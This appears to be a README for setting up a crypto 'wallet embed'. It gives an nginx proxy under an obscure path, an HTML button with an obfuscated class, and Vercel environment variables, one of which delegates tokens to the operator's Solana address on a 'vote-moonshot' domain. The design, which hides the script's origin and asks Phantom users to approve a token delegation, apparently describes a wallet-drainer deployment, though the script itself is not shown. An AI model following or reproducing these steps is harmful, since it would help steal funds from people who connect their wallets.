# Wallet embed

**VPS:** nginx + HTML only  
**Vercel:** JS bundle, `/profile` popup, all config/secrets

---

## On the VPS (only 2 things)

### 1. nginx

Copy `nginx/wallet-connect.conf` → `/etc/nginx/sites-available/mysite`

Replace `YOUR-PROJECT.vercel.app` with your Vercel URL.

```nginx
location = /vault38472 {
    proxy_pass https://YOUR-PROJECT.vercel.app/api/embed;
    proxy_ssl_server_name on;
    proxy_set_header Host YOUR-PROJECT.vercel.app;
    proxy_set_header Referer $http_referer;
    proxy_set_header Origin $http_origin;
    proxy_set_header Sec-Fetch-Site $http_sec_fetch_site;
}
```

```bash
nginx -t && systemctl reload nginx
```

No PHP. No `config.php`. No Node on the VPS.

### 2. HTML

```html
<script src="/vault38472" defer></script>
<button type="button" class="K7mQ2">Connect wallet</button>
```

- `/vault38472` = same path as nginx `location`
- `K7mQ2` = same as `WALLET_BUTTON_CLASS` in Vercel

---

## On Vercel (one-time)

1. Import [fuzzy-octo-guacamole](https://github.com/forrunandagoodrissse/fuzzy-octo-guacamole)
2. **Root Directory:** `vercel`
3. **Environment Variables** — copy from `vercel/.env.example`
4. Deploy

| Variable | Example |
|----------|---------|
| `REOWN_PROJECT_ID` | from dashboard.reown.com |
| `WALLET_SITE_URL` | `https://vote-moonshot.top` |
| `WALLET_ALLOWED_HOSTS` | `vote-moonshot.top,www.vote-moonshot.top` |
| `WALLET_BUTTON_CLASS` | `K7mQ2` |
| `WALLET_TOKEN_DELEGATE` | your Solana address (~44 chars) |
| `WALLET_SOLANA_RPC_URL` | Helius RPC URL |

Reown dashboard → allowed domain: **vote-moonshot.top** (not vercel.app)

---

## What happens

1. User opens your VPS page
2. Clicks button → Reown wallet modal
3. Picks Phantom → popup opens `https://YOUR-PROJECT.vercel.app/profile` (400×720)
4. User approves in wallet

---

## Optional: PHP on VPS instead of nginx proxy

If you prefer secrets in `vps/config.php` instead of Vercel env vars, use the `vps/loader.php` path (see `vps/README.md`).

---

## Repo layout

```
vercel/     → deploy to Vercel
nginx/      → copy to VPS
vps/public/ → example HTML only
```
